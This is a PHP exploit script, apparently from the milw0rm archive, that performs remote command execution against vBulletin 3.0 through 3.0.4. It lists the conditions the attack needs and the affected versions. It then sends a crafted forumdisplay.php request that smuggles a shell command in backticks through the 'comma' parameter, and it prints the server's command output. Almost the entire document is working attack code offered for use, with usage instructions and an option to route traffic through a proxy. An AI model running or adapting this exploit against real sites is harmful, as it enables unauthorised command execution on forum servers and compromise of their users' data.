<?php
/**************************************************************
#
# vbulletin 3.0.x execute command by AL3NDALEEB al3ndaleeb[at]uk2.net
#
# First condition : $vboptions['showforumusers'] == True , the admin must set
# showforumusers ON in vbulletin options.
# Second condition: $bbuserinfo['userid'] == 0 , you must be an visitor/guest .
# Third condition : $DB_site->fetch_array($forumusers) == True , when you
# visit the forums, it must has at least
# one user show the forum.
# Fourth condition: magic_quotes_gpc must be OFF
#
# Vulnerable Systems:
# vBulletin version 3.0 up to and including version 3.0.4
# 
# Immune systems:
# vBulletin version 3.0.5
# vBulletin version 3.0.6
# 
**************************************************************/

if (!(function_exists('curl_init'))) {
echo "cURL extension required\n";
exit;
}

if ($argv[3]){
$url = $argv[1];
$forumid = intval($argv[2]);
$command = $argv[3];
}
else {
echo "vbulletin 3.0 > 3.0.4 execute command by AL3NDALEEB al3ndaleeb[at]uk2.net\n\n";
echo "Usage: ".$argv[0]." <url> <forumid> <command> [proxy]\n\n";
echo "<url> url to vbulletin site (ex: http://www.vbulletin.com/forum/)\n";
echo "<forumid> forum id\n";
echo "<command> command to execute on server (ex: 'ls -la')\n";
echo "[proxy] optional proxy url (ex: http://proxy.ksa.com.sa:8080)\n\n";
echo "ex :\n";
echo "\tphp vb30x.php http://www.vbulletin.com/forum/ 2 \"ls -al\"";

exit;
}

if ($argv[4])
$proxy = $argv[4];



$action = 'forumdisplay.php?GLOBALS[]=1&f='.$forumid.'&comma=".`echo _START_`.`'.$command.'`.`echo _END_`."';

$ch=curl_init();
if ($proxy){
curl_setopt($ch, CURLOPT_PROXY,$proxy);
}
curl_setopt($ch, CURLOPT_URL,$url.'/'.$action);
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
$res=curl_exec ($ch);
curl_close ($ch);
$res = substr($res, strpos($res, '_START_')+7);
$res = substr($res,0, strpos($res, '_END_'));
echo $res;


?>

// milw0rm.com [2005-02-15]
